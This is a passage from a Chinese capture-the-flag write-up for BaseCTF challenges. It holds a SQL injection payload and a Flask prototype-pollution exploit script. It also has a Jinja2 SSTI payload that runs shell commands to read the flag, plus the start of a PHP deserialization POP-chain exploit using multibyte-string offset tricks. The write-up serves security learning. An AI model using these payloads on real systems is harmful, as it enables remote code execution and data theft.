</span></span></span></code></pre></td></tr></table></div></div><p>成功读取了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?sql=%0adelimiter wi%0ahandler flag openwi%0ahandler flag read next
</span></span></code></pre></td></tr></table></div></div><h2 id=fin-lucky-number>[Fin] Lucky Number</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span><span class=n>request</span><span class=p>,</span><span class=n>render_template_string</span><span class=p>,</span><span class=n>render_template</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>jinja2</span> <span class=kn>import</span> <span class=n>Template</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>heaven</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>merge</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=n>dst</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>src</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=s1>&#39;__getitem__&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dst</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=nb>getattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>setattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cls</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>instance</span> <span class=o>=</span> <span class=bp>cls</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BLACKLIST_IN_index</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;{&#39;</span><span class=p>,</span><span class=s1>&#39;}&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>is_json</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/m4G1c&#39;</span><span class=p>,</span><span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pollute</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>is_json</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>merge</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>data</span><span class=p>),</span> <span class=n>instance</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>heaven</span><span class=o>.</span><span class=n>create</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>message</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=s2>&#34;message&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;这个魔术还行吧</span>
</span></span><span class=line><span class=cl><span class=s2>&#34; + message</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;我要json的魔术&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;记得用POST方法把魔术交上来&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#heaven.py</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create</span><span class=p>(</span><span class=n>kon</span><span class=o>=</span><span class=s2>&#34;Kon&#34;</span><span class=p>,</span> <span class=n>pure</span><span class=o>=</span><span class=s2>&#34;Pure&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>,</span> <span class=n>confirm</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>confirm</span> <span class=ow>and</span> <span class=s2>&#34;lucky_number&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>create</span><span class=o>.</span><span class=vm>__kwdefaults__</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&#34;</span><span class=p>,</span> <span class=s2>&#34;lucky_number&#34;</span><span class=p>:</span> <span class=s2>&#34;nope&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>confirm</span> <span class=ow>and</span> <span class=s2>&#34;lucky_number&#34;</span> <span class=ow>in</span> <span class=n>create</span><span class=o>.</span><span class=vm>__kwdefaults__</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;这是你的lucky_number，请拿好，去/check下检查一下吧&#34;</span><span class=p>,</span> <span class=s2>&#34;lucky_number&#34;</span><span class=p>:</span> <span class=n>create</span><span class=o>.</span><span class=vm>__kwdefaults__</span><span class=p>[</span><span class=s2>&#34;lucky_number&#34;</span><span class=p>]}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;你有什么想创造的吗？&#34;</span><span class=p>,</span> <span class=s2>&#34;lucky_number&#34;</span><span class=p>:</span> <span class=s2>&#34;nope&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么很明显看到可以污染两个属性之后就可以进行SSTI了</p><p><code>confirm</code>和<code>lucky_number</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span><span class=s2>&#34;http://challenge.basectf.fun:30938&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;__init__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;__globals__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;json&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;__spec__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;__init__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;__globals__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                            <span class=s2>&#34;sys&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                                <span class=s2>&#34;modules&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                                    <span class=s2>&#34;heaven&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                                        <span class=s2>&#34;create&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                                            <span class=s2>&#34;__kwdefaults__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                                                <span class=s2>&#34;confirm&#34;</span><span class=p>:</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                <span class=s2>&#34;lucky_number&#34;</span><span class=p>:</span><span class=s2>&#34;5346&#34;</span>
</span></span><span class=line><span class=cl>                                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                                <span class=p>}</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span><span class=s1>&#39;application/json&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>payload_json</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>payload_json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;/m4G1c&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>payload_json</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;这个魔术还行吧&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>r1</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;/check&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>然后进行SSTI</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://challenge.basectf.fun:32611/ssSstTti1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>flag={{url_for.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;tac /f*&#39;).read()}}
</span></span></code></pre></td></tr></table></div></div><h2 id=fin-ez_php>[Fin] ez_php</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__file__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>substrstr</span><span class=p>(</span><span class=nv>$data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$start</span> <span class=o>=</span> <span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;[&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$end</span> <span class=o>=</span> <span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;]&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>mb_substr</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$start</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=nv>$end</span> <span class=o>-</span> <span class=mi>1</span> <span class=o>-</span> <span class=nv>$start</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hacker</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$start</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>=</span><span class=nv>$start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>end</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/ctfer/i&#39;</span><span class=p>,</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;Hacker！&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>C</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>-&gt;</span><span class=na>c</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;C&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>T</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>t</span><span class=o>-&gt;</span><span class=na>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>F</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f</span><span class=o>-&gt;</span><span class=na>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>E</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$e</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__isset</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>e</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>R</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ez_ser.from_you&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ctf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Hacker</span><span class=p>(</span><span class=s1>&#39;{{{&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ez_ser.from_you&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;}}}&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/\[|\]/i&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;substr&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;NONONO!!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pre</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;substr&#39;</span><span class=p>])</span><span class=o>?</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;substr&#39;</span><span class=p>]</span><span class=o>:</span><span class=s2>&#34;substr&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ser_ctf</span> <span class=o>=</span> <span class=nx>substrstr</span><span class=p>(</span><span class=nv>$pre</span><span class=o>.</span><span class=s2>&#34;[&#34;</span><span class=o>.</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$ctf</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;]&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$ser_ctf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s2>&#34;杂鱼~杂鱼~&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这一看就是一个逃逸序列化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Hacker::destruct-&gt;C::toString-&gt;T::call-&gt;F::get-&gt;E::isset-&gt;R::invoke
</span></span></code></pre></td></tr></table></div></div><p>wakeup直接引用地址绕过，我记得我的<code>php反序列化</code>里面提及到过，将<code>end</code>处理了，外面会再序列化一层，这里与nep中的一样，需要逃逸，我再写写</p><blockquote><p>每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节(向后移动三位)
每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节(向后移动两位)
每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节(向后移动一位)</p><p>每发送一个%9f,mb_strpos会忽略，mb_substr认为是1个字节，相差1个字节(向前移动一位)</p></blockquote><p>然后我们先写<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hacker</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$end</span><span class=p>;</span>
